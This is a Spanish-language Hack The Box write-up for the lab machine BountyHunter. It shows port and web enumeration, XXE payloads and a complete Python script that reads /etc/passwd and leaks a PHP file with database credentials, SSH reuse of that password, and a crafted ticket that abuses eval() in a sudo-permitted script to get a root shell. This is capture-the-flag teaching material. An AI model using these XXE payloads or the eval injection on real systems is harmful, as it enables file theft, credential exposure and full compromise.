---
title:  "BountyHunter Writeup [ES] - HackTheBox"
date:   2021-11-26 17:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [easy, linux, xxe, python, web]
---

[BountyHunter](https://app.hackthebox.com/machines/359) es una máquina **Linux** de dificultad fácil ofrecida por la plataforma de [Hack The Box](https://app.hackthebox.com/). A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.


## Información


![Info](/images/HTB/BountyHunter/01-info.png)


## Enumeración

### NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos.

* ```nmap -p- -sS --min-rate 4000 -n -v -oG allPorts.gnmap 10.10.11.100```

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 01:12 -03
Initiating SYN Stealth Scan at 01:12
Scanning 10.10.11.100 [65535 ports]
Discovered open port 22/tcp on 10.10.11.100
Discovered open port 80/tcp on 10.10.11.100
Completed SYN Stealth Scan at 01:13, 23.87s elapsed (65535 total ports)
Nmap scan report for 10.10.11.100
Host is up (0.15s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.23 seconds
```

Posteriormente se realiza un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.

* ```nmap -sC -sV -p22,80 -n -oN ports.nmap 10.10.11.100```

```plaintext
Nmap scan report for 10.10.11.100
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* Resumen puertos

| Puerto    | Estado  | Servicio                           |
|-----------|---------|------------------------------------|
| 22/tcp    | Abierto | OpenSSH 8.2p1 - Ubuntu              |
| 80/tcp    | Abierto | Apache httpd 2.4.41                |


### Enumeración web

Lo primero que se visualiza al apuntar a la IP de la máquina, es una página web simple que simula ser una empresa de pentesting.

![](/images/HTB/BountyHunter/05-web-home.png)

En el menú se encuentra un acceso que parece interesante.

![](/images/HTB/BountyHunter/10-portal.png)

El enlace **Portal** redirige hacia el recurso ```portal.php``` que a su vez indica otro enlace para testear un sistema para registrar bountys.

![](/images/HTB/BountyHunter/15-portal-redirect.png)

Siguiendo el enlace se llega a ```log_submit.php```, el cual es un formulario que permite ingresar cuatro valores para catalogar un bounty.

![](/images/HTB/BountyHunter/20-bounty-report-1.png)

Lo primero en este caso es verificar si este formulario es vulnerable a ```xss``` o ```sqli```, pero después de intentar un momento, se verifica que no lo es.

Al darle a **submit**, entrega una vista previa de "como se ingresaría a la base de datos" si el sistema estuviera listo.

![](/images/HTB/BountyHunter/25-bounty-report-2.png)

Verificando el código fuente, se identifica que la web llama a un recurso **javascript** llamado ```bountylog.js```.

![](/images/HTB/BountyHunter/27-bountylog.js.png)

![](/images/HTB/BountyHunter/28-bountylog.js-content.png)

Dentro se visualiza como se ejecuta una petición de tipo **POST** hacia la url ```tracker_diRbPr00f314.php``` y antes de emitirla, la pasa por la función btoa, la cual se encarga de encodear en **base64** la data.

![](/images/HTB/BountyHunter/29-btoa.png)

Siguiendo adelante, lo más cómodo es interceptar la petición con **Burp Suite** y validamos que efectivamente, la data viaja encodeada en **base64** y **urlencode**.


![](/images/HTB/BountyHunter/30-burp-suite.png)

Utilizando el decoder nativo de Burp, se puede reversar la string para obtener su valor, lo cual muestra un formato tipo **xml** en donde viaja lo ingresado en el formulario anterior.

![](/images/HTB/BountyHunter/35-burp-xml.png)

Sabiendo esto, es posible pensar que sea vulnerable a inyecciones **XXE**. Bajo esta base, se prueba intentar listar el archivo ```/etc/passwd``` creando la entidad **xxe** e inyectándola en el campo title. 

![](/images/HTB/BountyHunter/40-xxe.png)

Al darle **send** desde el repeater de Burp, se obtiene una respuesta en blanco, por lo que seguramente el sistema espera que se envíe la consulta encodeada.

![](/images/HTB/BountyHunter/50-xxe-passwd.png)

Efectivamente al realizar el encode **base64** + **urlencode** se obtiene capacidad de leer archivos locales de la máquina.

## Ganando acceso

Para este caso he desarrollado un pequeño **script** en python3[^script] que permite leer archivos locales utilizando dos modos:

* **file**: Permite leer archivos locales.
* **wrapper**: Permite utilizar el wrapper PHP para obtener el código de un archivo en base64.

La utilización del script es como se muestra a continuación.

* ```python3 xxe.py <mode> <file>```

![](/images/HTB/BountyHunter/60-python-script-passwd.png)

De esta forma se obtiene el resultado desde consola y se automatiza el encoding para avanzar más rápido en la extracción de información. 

Se obtiene un usuario potencial: ```development``` que posee una consola tipo **bash**. Ahora solo restaría conseguir una contraseña para intentar una autenticación contra el servicio **SSH** que se encontraba expuesto.

Continuando con la enumeración web, se lanza un fuzzing con **gobuster** para detectar posibles recursos interesantes en **php**.

* ```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -x "php,html,txt" -t 100 --no-error```

![](/images/HTB/BountyHunter/62-db.php.png)

Se encuentra un archivo llamado ```db.php``` que se encuentra en la raíz de la web. Al utilizar nuestro script ```xxe.py``` con el modo **wrapper** para encodearlo en base64, se obtiene la siguiente string.

![](/images/HTB/BountyHunter/65-python-script-wrapper-db.php.png)

```plaintext
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

al decodificarla se obtienen credenciales para una base de datos.

![](/images/HTB/BountyHunter/68-db.php-content.png)

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```



Ahora que se tienen credenciales, se pueden testear contra el servicio SSH.

![](/images/HTB/BountyHunter/80-development-ssh.png)

Y resultan ser válidas para el usuario **development**. Ahora solo resta buscar una vía para escalar privilegios.

## Escalada de privilegios

![](/images/HTB/BountyHunter/85-ls-la.png)

Al leer archivos del home se visualiza la *flag* y un archivo llamado ```contract.txt``` que pone lo siguiente.

```plaintext
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

Dentro del texto hay una sección en particular donde habla de que se han seteados los permisos correctos para la validación de tickets. Esto inmediatamente nos hace pensar en que nuestro user contiene permisos especiales seteados a nivel de sudo.

![](/images/HTB/BountyHunter/90-sudo-l.png)

Esto nos dice que podemos ejecutar como **root** y utlizando **python3.8** el script ```ticketValidator.py```. En este caso todas las rutas se están llamando desde su path absoluto y el script es de propiedad de root, por lo que no es posible editarlo y ```Path Hijacking``` está descartado.

Validando el interior del script, se verifica que no importa librerías, por lo que tampoco podríamos pensar en un **Library Hijacking**

![](/images/HTB/BountyHunter/95-head-validator.py.png)

Volviendo atrás, el archivo ```contracts.txt``` indicaba que los tickets estaban fallando en pasar la validación, esto nos hace pensar que pueden existir tickets rechazados. Dando un vistazo rápido al script ```ticketValidator.py``` vemos que lee archivos con extensión ```.md``` para su posterior análisis.

Con esto, al utilizar find, encontramos unos cuantos que han sido rechazados.

![](/images/HTB/BountyHunter/100-tickets.png)

Al ejecutar el script, nos solicitará indicar la ruta de un "ticket" para su evaluación. Le proporcionaremos uno de los encontrados anteriormente.

![](/images/HTB/BountyHunter/105-tickets-2.png)

Y nos responde indicando el destino y posteriormente que es inválido.

Bajo estas circunstancias solo restaría leer el script completo para averiguar que validaciones se están realizando y encontrar posibles vulnerabilidades que se puedan explotar.

* ```ticketValidator.py```

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Leyendo con detención el script, vemos que realiza una serie de validaciones a los "tickets" para evaluar si son validos o no. Además de esto, en una porción del código realiza un ```eval()``` de una línea en particular, por lo que nos interesa que el "ticket" pase las validaciones para que llegados a este punto, sea posible inyectar comandos.

Las validaciones que hace son las siguientes:

1. Valida que el archivo tenga extensión ```.md```
2. Que comience por la cadena ```# Skytrain Inc``` en la primera línea.
3. Que comience por la cadena ```## Ticket to ``` en la segunda línea.
4. Que comience por la cadena ```__Ticket Code:__``` en la tercera línea.
5. Que comience por la cadena ```**``` en su cuarta línea.
6. Que el número seguido de ```**``` y delimitado por un ```+``` sea divisible por ```7``` y arroje como resto ```4```.

Cumpliendo con estas condiciones, el archivo .md llegará hasta la sentencia ```eval()``` en donde se podría intentar inyectar código para su ejecución con altos privilegios. 

Sabiendo lo anterior, podríamos construir un archivo con este contenido:

* ```test.md```

```plaintext
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**46+410
```

![](/images/HTB/BountyHunter/110-valid-ticket.png)

Y efectivamente nuestro ticket pasó las verificaciones y ya es válido. Esto quiere decir que pasó por el ```eval()``` del código y ahora es tiempo para inyectar el comando que nos interesa. Para hacerlo es muy sencillo, solo se debe agregar un ```and``` luego de la operación matemática e importar la librería ```os``` para ejecutar una **bash**.

![](/images/HTB/BountyHunter/120-payload-ticket.png)

Al momento de ejecutarse de nuevo y pasar por el ```eval()``` se ejecuta arbitraríamente el comando y ya se obtiene una consola como root. 


## Recursos

[^script]: XXE Script for BountyHunter [HTB]

```python
#/usr/bin/python3
# Author: Cervant (https://brsalcedom.github.io)

from bs4 import BeautifulSoup
from termcolor import colored, cprint
import base64, argparse, json, requests

parser = argparse.ArgumentParser(
    description="XXE script for BountyHunter [HTB] - Cervant"
)
parser.add_argument("mode", help="XXE mode, options: file/wrapper")
parser.add_argument("filename", help="File to read/include: /etc/passwd")
args = parser.parse_args()

post_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
burp = { 'http' : 'http://127.0.0.1:8080' }

headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
}

mode = args.mode
file = args.filename

xxe_file="""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{}"> ]>
<bugreport>
<title>&xxe;</title>
<cwe>codigo</cwe>
<cvss>score</cvss>
<reward>plata</reward>
</bugreport>""".format(file)

xxe_wrapper="""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={}"> ]>
<bugreport>
<title>&xxe;</title>
<cwe>codigo</cwe>
<cvss>score</cvss>
<reward>plata</reward>
</bugreport>""".format(file)

def request(xxe):

    payload = base64.b64encode(xxe.encode())

    post_data = {
        'data' : payload
    }

    r = requests.post(post_url,data=post_data, headers=headers)
    soup = BeautifulSoup(r.text, "html.parser")
    response = str(soup.find_all("td")[1].text).strip()
    cprint("\n" + response, 'white')

if __name__ == '__main__':

    if mode == 'file':
        request(xxe_file)
    elif mode == 'wrapper':
        request(xxe_wrapper)
    else:
        parser.print_help()

```
{: file="xxe.py" }